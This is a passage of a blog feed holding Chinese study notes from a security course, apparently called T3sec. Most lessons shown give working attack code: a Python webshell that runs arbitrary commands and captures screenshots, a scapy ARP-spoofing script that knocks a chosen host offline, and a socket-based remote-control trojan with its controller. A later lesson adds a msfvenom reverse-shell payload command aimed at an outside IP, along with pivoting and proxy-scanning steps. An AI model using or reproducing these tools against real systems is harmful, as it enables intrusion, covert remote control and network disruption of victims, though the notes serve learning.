    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E4%B8%89%E8%AE%B2-webshell/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E4%B8%89%E8%AE%B2-webshell/</id>
    <published>2020-05-20T01:25:08.698Z</published>
    <updated>2020-05-21T10:29:01.877Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第十三讲-webshell"><a href="#T3SEC-—–第十三讲-webshell" class="headerlink" title="T3SEC —–第十三讲:webshell"></a>T3SEC —–第十三讲:webshell</h1>    <div id="aplayer-LLkicJPD" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><h1 id="webshell-截屏远程控制利器"><a href="#webshell-截屏远程控制利器" class="headerlink" title="webshell,截屏远程控制利器"></a>webshell,截屏远程控制利器</h1><h2 id="技术分解"><a href="#技术分解" class="headerlink" title="技术分解:"></a>技术分解:</h2><ul><li>webspp:web应用</li><li>http:80/https:443/ws:80/wss:443<ul><li>通信协议:</li><li>http(https)/tcp/udp/ws(wss)</li></ul></li><li>cmd/shell等</li><li>html/css/js等</li><li>python/asp/php/jsp等</li><li>二进制等</li><li>流控制等</li></ul><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell:"></a>webshell:</h2><ul><li>urlshell</li><li>view shell</li></ul><h3 id="打包时后面加-m可隐藏命令行"><a href="#打包时后面加-m可隐藏命令行" class="headerlink" title="打包时后面加 -m可隐藏命令行"></a>打包时后面加 -m可隐藏命令行</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python webshell</span></span><br><span class="line"><span class="comment"># 步骤:</span></span><br><span class="line"><span class="comment">#1:构建一款HTTP协议的服务器</span></span><br><span class="line"><span class="comment">#2:独立开放特定端口(http80/自定义端口)</span></span><br><span class="line"><span class="comment">#3:构建一个视图view(mvc)-&gt;APP</span></span><br><span class="line"><span class="comment">#4:执行shell命令 + 截取对方的桌面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#环境: tornado pyautogui os </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tornado.web <span class="keyword">import</span> RequestHandler,Application</span><br><span class="line"><span class="keyword">from</span> tornado.ioloop <span class="keyword">import</span> IOLoop </span><br><span class="line"><span class="keyword">from</span> tornado.options <span class="keyword">import</span> options,parse_command_line,define</span><br><span class="line"><span class="keyword">from</span> tornado.httpserver <span class="keyword">import</span> HTTPServer</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.system()==<span class="string">'Windows'</span>:</span><br><span class="line">    <span class="keyword">import</span> asyncio</span><br><span class="line">    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())</span><br><span class="line"></span><br><span class="line">define(<span class="string">'port'</span>,default=<span class="number">14444</span>,help=<span class="string">'这是http协议的通信端口'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#视图类 (页面)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span><span class="params">(RequestHandler)</span>:</span></span><br><span class="line">    <span class="comment">#post get</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#定义并获取url的参数http://localhost:14444/?wd=</span></span><br><span class="line">        cmd=self.get_query_argument(<span class="string">"wd"</span>,<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'screenshot'</span>:</span><br><span class="line">            <span class="comment">#截屏操作</span></span><br><span class="line">            img=pyautogui.screenshot()</span><br><span class="line">            img.save(<span class="string">'screenshot.jpg'</span>)</span><br><span class="line">            <span class="comment">#二进制返回</span></span><br><span class="line">            pic = open(<span class="string">'screenshot.jpg'</span>,<span class="string">'rb'</span>)</span><br><span class="line">            pics = pic.read()</span><br><span class="line">            self.write(pics)</span><br><span class="line">            self.set_header(<span class="string">"Content-type"</span>,<span class="string">"image/png"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rs=os.popen(cmd,<span class="string">'r'</span>)</span><br><span class="line">            self.write(rs.read())</span><br><span class="line">            </span><br><span class="line"><span class="comment">#应用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeapp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> Application([(<span class="string">r'/'</span>,index)])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parse_command_line()</span><br><span class="line">    app=makeapp()</span><br><span class="line">    <span class="comment">#装载 把应用部署到httpserver中</span></span><br><span class="line">    server = HTTPServer(app)</span><br><span class="line">    server.bind(options.port)</span><br><span class="line">    server.start()</span><br><span class="line">    <span class="comment">#轮询监听</span></span><br><span class="line">    IOLoop.current().start()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
      <category term="python" scheme="http://www.fangmingxuan.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第十二讲-阻网</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%AE%B2-%E9%98%BB%E7%BD%91/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%AE%B2-%E9%98%BB%E7%BD%91/</id>
    <published>2020-05-19T05:22:12.400Z</published>
    <updated>2020-06-02T06:43:43.884Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第十二讲-阻网小军刀"><a href="#T3SEC-—–第十二讲-阻网小军刀" class="headerlink" title="T3SEC —–第十二讲:阻网小军刀"></a>T3SEC —–第十二讲:阻网小军刀</h1>    <div id="aplayer-cpZPhVLw" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>实战自编阻网小军刀/木马/蠕虫</p><h2 id="岗位"><a href="#岗位" class="headerlink" title="岗位:"></a>岗位:</h2><ul><li><strong>等保测评</strong>-网络安全,系统安全,web渗透工具.对数据库,网络等的渗透攻防</li><li><strong>安全运维</strong>-网络系统维护,保护防止黑客攻击. 网络安全,系统安全 web渗透,渗透实战</li><li><strong>渗透测试</strong>-模拟黑客攻击,挖掘漏洞,隐患 并提出意见.web安全编程,web渗透,渗透实战,python黑帽子</li><li><strong>攻防工程师</strong>-黑帽子,白帽子.网络安全 ,系统安全,web安全,web渗透,黑白帽子</li></ul><h2 id="本案例涉及知识及技能"><a href="#本案例涉及知识及技能" class="headerlink" title="本案例涉及知识及技能:"></a>本案例涉及知识及技能:</h2><ul><li>网络技术</li><li>内网渗透</li><li>数据包和头部定义</li><li>实用编程语言-python</li></ul><h2 id="适合人群"><a href="#适合人群" class="headerlink" title="适合人群:"></a>适合人群:</h2><ul><li>python基本语法</li><li>操作系统命令</li><li>网络基本认知/二层/三层概念</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#实现思路:攻击网络中的指定ip实现断网-ARP</span></span><br><span class="line"><span class="comment">#原理:通过扫描当前攻击机的ip地址得到内网的所有ip所在网关</span></span><br><span class="line"><span class="comment">#选择需要攻击的ip,组成ARP数据包,对王馆内的主机先发起ping,有主机存活</span></span><br><span class="line"><span class="comment">#获得存活列表.选择需要攻击的ip,发起攻击</span></span><br><span class="line"><span class="comment">#步骤:</span></span><br><span class="line"><span class="comment">#1:获得当前ip及网关 route print</span></span><br><span class="line"><span class="comment">#2:封装ARP数据包以以太网的包结构形式来发起ping操作,得到存活主机列表</span></span><br><span class="line"><span class="comment">#3:得到存活主机列表</span></span><br><span class="line"><span class="comment">#4:选择攻击或阻网的ip</span></span><br><span class="line"><span class="comment">#5:ARP攻击 (封包/发包)--&gt;&gt; 代理,抓包</span></span><br><span class="line"><span class="comment">#6:设置攻击时长</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># pip install scapy</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan2spoof</span><span class="params">()</span>:</span></span><br><span class="line">    netcard = <span class="string">'Realtek PCIe GBE Family Controller'</span><span class="comment">#攻击的网卡</span></span><br><span class="line">    cmdcode = <span class="string">"route print"</span></span><br><span class="line">    <span class="comment">#执行cmd命令,获得当前主机ip和网关</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> os.popen(cmdcode):</span><br><span class="line">        <span class="comment">#通过line获得ipv4和网关</span></span><br><span class="line">        s = line.strip()</span><br><span class="line">        <span class="keyword">if</span> s.startswith(<span class="string">'0.0.0.0'</span>):</span><br><span class="line">            iplist = s.split()</span><br><span class="line">            ip = iplist[<span class="number">3</span>]<span class="comment">#当前ip</span></span><br><span class="line">            gw = iplist[<span class="number">2</span>]<span class="comment">#网关</span></span><br><span class="line">            <span class="comment"># print(ip)</span></span><br><span class="line">            <span class="comment"># print(gw)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"使用的网卡是:&#123;&#125;"</span>.format(netcard))</span><br><span class="line">    print(<span class="string">"本机的上网ip是:&#123;&#125;"</span>.format(ip))</span><br><span class="line">    print(<span class="string">"本机的上网网关:&#123;&#125;"</span>.format(gw))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#封装一个ARP的数据包,符合以太网的包定义</span></span><br><span class="line">    arppk = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>) / ARP(pdst=gw+<span class="string">"/24"</span>)</span><br><span class="line">    ansip,unansip = srp(arppk,iface=netcard,timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">"扫描到&#123;&#125;台在线主机"</span>.format(len(ansip)))</span><br><span class="line">    print(<span class="string">"扫描到&#123;&#125;台不在线主机"</span>.format(len(unansip)))</span><br><span class="line"></span><br><span class="line">    ansresip=[]</span><br><span class="line">    <span class="keyword">for</span> s,r <span class="keyword">in</span> ansip:</span><br><span class="line">        ansresip.append([r.psrc,r.hwsrc])<span class="comment">#ip,mac</span></span><br><span class="line">    ansresip.sort()<span class="comment">#去重排序</span></span><br><span class="line">    <span class="keyword">for</span> ip,mac <span class="keyword">in</span> ansresip:</span><br><span class="line">        print(ip,<span class="string">"------&gt;"</span>,mac)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#代理/抓包</span></span><br><span class="line">    <span class="comment">#阻断网络</span></span><br><span class="line">    vip=input(<span class="string">"请输入需要攻击的ip:"</span>)</span><br><span class="line">    ttl=int(input(<span class="string">"请输入需要攻击的时间(秒):"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#以下实现arp攻击即可</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(ttl*<span class="number">5</span>):</span><br><span class="line">        sendp(Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>) / ARP(pdst=vip,psrc=gw),verbose=<span class="number">0</span>)</span><br><span class="line">        sendp(Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>) / ARP(pdst=gw,psrc=vip),verbose=<span class="number">0</span>)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    print(<span class="string">"对&#123;&#125;的ARP攻击完成"</span>.format(vip))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">    scan2spoof()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
      <category term="python" scheme="http://www.fangmingxuan.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第十一讲-自编木马实战</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E4%B8%80%E8%AE%B2-%E8%87%AA%E7%BC%96%E6%9C%A8%E9%A9%AC%E5%AE%9E%E6%88%98/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E4%B8%80%E8%AE%B2-%E8%87%AA%E7%BC%96%E6%9C%A8%E9%A9%AC%E5%AE%9E%E6%88%98/</id>
    <published>2020-05-18T09:18:05.235Z</published>
    <updated>2020-06-04T11:28:07.901Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第十一讲-自编木马实战"><a href="#T3SEC-—–第十一讲-自编木马实战" class="headerlink" title="T3SEC —–第十一讲:自编木马实战"></a>T3SEC —–第十一讲:自编木马实战</h1>    <div id="aplayer-cPtpQecr" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p><strong>自编</strong>  <strong>进入环境后可不依赖其他工具</strong></p><h1 id="自编远程控制电脑木马"><a href="#自编远程控制电脑木马" class="headerlink" title="自编远程控制电脑木马"></a>自编远程控制电脑木马</h1><h2 id="涉及知识或技术"><a href="#涉及知识或技术" class="headerlink" title="涉及知识或技术:"></a>涉及知识或技术:</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><ul><li>win/linux/unix/android ……..</li><li>命令,服务,特性.</li></ul><h3 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h3><ul><li>osi七层网络</li><li>tcp/ip 协议族群<ul><li>应用层</li><li>传输层:tcp/udp</li><li>网络层</li><li>链路层</li></ul></li></ul><h3 id="实用的程序语言"><a href="#实用的程序语言" class="headerlink" title="实用的程序语言"></a>实用的程序语言</h3><ul><li>python</li><li>go</li><li>ruby</li><li>html,js<ul><li>环境简单</li><li>弱规则语言</li><li>第三方强大的标准库</li><li>以及自定义的库或模块</li></ul></li></ul><h3 id="打包工具"><a href="#打包工具" class="headerlink" title="打包工具"></a>打包工具</h3><p>线上学习要素: 圈子(学习圈子),学什么怎么学,学习效果,拜师..</p><h2 id="被攻击机"><a href="#被攻击机" class="headerlink" title="被攻击机:"></a>被攻击机:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#server:放在被攻击机-木马</span></span><br><span class="line"><span class="comment">#gui-dos-cmd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个连接tcp</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">qq=socket(AF_INET,SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#绑定主机ip</span></span><br><span class="line">address = (<span class="string">""</span>,<span class="number">12345</span>)</span><br><span class="line">qq.bind(address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#监听</span></span><br><span class="line">qq.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    newsct,clientsct=qq.accept()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = newsct.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="comment">#判断cmd是否有内容</span></span><br><span class="line">        <span class="keyword">if</span> len(cmd)&gt;<span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"console:"</span>+cmd.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">            <span class="comment">#以下可做控制操作</span></span><br><span class="line">            res=os.popen(cmd.decode(<span class="string">'utf-8'</span>),<span class="string">'r'</span>)</span><br><span class="line">            newsct.send(res.read().encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            res.close()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">newsct.close()</span><br></pre></td></tr></table></figure><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机:"></a>攻击机:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#client</span></span><br><span class="line"><span class="comment">#控制端</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建socket内容</span></span><br><span class="line">tcpsocket=socket(AF_INET,SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#连接</span></span><br><span class="line">serAddress=(<span class="string">'127.0.0.1'</span>,<span class="number">12345</span>)</span><br><span class="line">tcpsocket.connect(serAddress)</span><br><span class="line"></span><br><span class="line"><span class="comment">#操作</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sendcmd=input(<span class="string">"msf&gt;&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sendcmd)&gt;<span class="number">0</span>:</span><br><span class="line">        tcpsocket.send(sendcmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#/接受执行后结果</span></span><br><span class="line">    recv=tcpsocket.recv(<span class="number">4096</span>)</span><br><span class="line">    print(recv.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment">#关闭socket</span></span><br><span class="line">tcpsocket.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
      <category term="python" scheme="http://www.fangmingxuan.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第十讲-服务器安全加固</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E8%AE%B2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%8D%81%E8%AE%B2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</id>
    <published>2020-05-17T07:58:11.414Z</published>
    <updated>2020-05-17T08:13:53.363Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第十讲-服务器安全加固"><a href="#T3SEC-—–第十讲-服务器安全加固" class="headerlink" title="T3SEC —–第十讲:服务器安全加固"></a>T3SEC —–第十讲:服务器安全加固</h1>    <div id="aplayer-RYexnaYB" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><h3 id="长城网络靶场竞技系统"><a href="#长城网络靶场竞技系统" class="headerlink" title="长城网络靶场竞技系统"></a>长城网络靶场竞技系统</h3><h3 id="实验吧"><a href="#实验吧" class="headerlink" title="实验吧"></a>实验吧</h3><h3 id="ctf训练营"><a href="#ctf训练营" class="headerlink" title="ctf训练营"></a>ctf训练营</h3><h1 id="各体系路线"><a href="#各体系路线" class="headerlink" title="各体系路线"></a>各体系路线</h1><ul><li>1.<strong>网络安全</strong>:协议分析,企业网络安全架构设计项目实战</li><li>2.<strong>系统安全</strong>:系统加固,入侵排查,应急响应</li><li>3<strong>.web安全编程</strong>:http,php,java,数据库安全</li><li>4<strong>.web渗透工具</strong>:工具,SRC，漏洞挖掘，代码审计，ｗｅｂ渗透测试项目实战　</li><li>５<strong>.渗透实战</strong>：主机渗透，内网渗透，python渗透编程,渗透测试项目实战</li><li>6.<strong>python黑帽子</strong>:python基础编程,python渗透实战,python编写poc实战</li><li><strong>7.逆向</strong>.<strong>二进制</strong>及CTF专项</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第九讲-内网转发穿透</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E4%B9%9D%E8%AE%B2-%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%A9%BF%E9%80%8F/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E4%B9%9D%E8%AE%B2-%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%A9%BF%E9%80%8F/</id>
    <published>2020-05-17T07:03:47.966Z</published>
    <updated>2020-05-17T07:51:42.716Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第九讲-内网转发穿透"><a href="#T3SEC-—–第九讲-内网转发穿透" class="headerlink" title="T3SEC —–第九讲:内网转发穿透"></a>T3SEC —–第九讲:内网转发穿透</h1>    <div id="aplayer-SEiTqGfC" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>内网穿透和代理转发</p><h1 id="一-内网穿透"><a href="#一-内网穿透" class="headerlink" title="一.内网穿透"></a>一.内网穿透</h1><p>花生壳  frp  等……</p><h2 id="内网穿透–获取内网服务器的session"><a href="#内网穿透–获取内网服务器的session" class="headerlink" title="内网穿透–获取内网服务器的session"></a>内网穿透–获取内网服务器的session</h2><ul><li>配置frp穿透   <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></li><li>22==&gt;6000    4444==&gt;6002</li><li>使用木马反弹session</li><li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=123.57.147.141LPORT=6002 -f exe &gt;test.exe</li><li>选择模块 use exploit/multi/handler 设置set payload windows/meterpreter/reverse_tcp<ul><li>set lhost 192.168.1.1</li><li>set lport 4444</li></ul></li></ul><h1 id="二-内网代理转发"><a href="#二-内网代理转发" class="headerlink" title="二.内网代理转发"></a>二.内网代理转发</h1><h2 id="在msf下可使用"><a href="#在msf下可使用" class="headerlink" title="在msf下可使用"></a>在msf下可使用</h2><ul><li>run post/windows/gather/arp_scanner rhost=192.168.1.0/24   //扫描内网中的192.168.1.0 网段</li><li>run post/multi/manage/autoroute  //自动添加路由</li><li>run sutoroute -s 192.168.2.1/24  //添加192.168.2.1/24 的路由</li><li>run autoroute -p //查看路由条目</li></ul><h2 id="socks-代理"><a href="#socks-代理" class="headerlink" title="socks 代理"></a>socks 代理</h2><ul><li>use auxiliary/server/socks4a //设置socks代理服务器</li></ul><h3 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h3><ul><li>proxychains遵循GUN协议的一款适用于Linux系统的网络代理设置工具.强制由任一程序发起的TCP连接请求必须通过注入TOP或SOCKS4,SOCKS5 或HTTP(S)代理.支持的认证方式包括:SOCKS4/5的用户/密码认证,HTTP的基本认证.允许TCP和DNS通过代理隧道,并且可配置多个代理.</li></ul><h3 id="proxychains配置"><a href="#proxychains配置" class="headerlink" title="proxychains配置"></a>proxychains配置</h3><ul><li>vi /etc/proxychains.cof</li><li>proxychains 使用</li><li>proxychains nmap -sT -sV –script=vuln 192.168.1.100</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第八讲-nc后门</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%85%AB%E8%AE%B2-nc%E5%90%8E%E9%97%A8/"/>
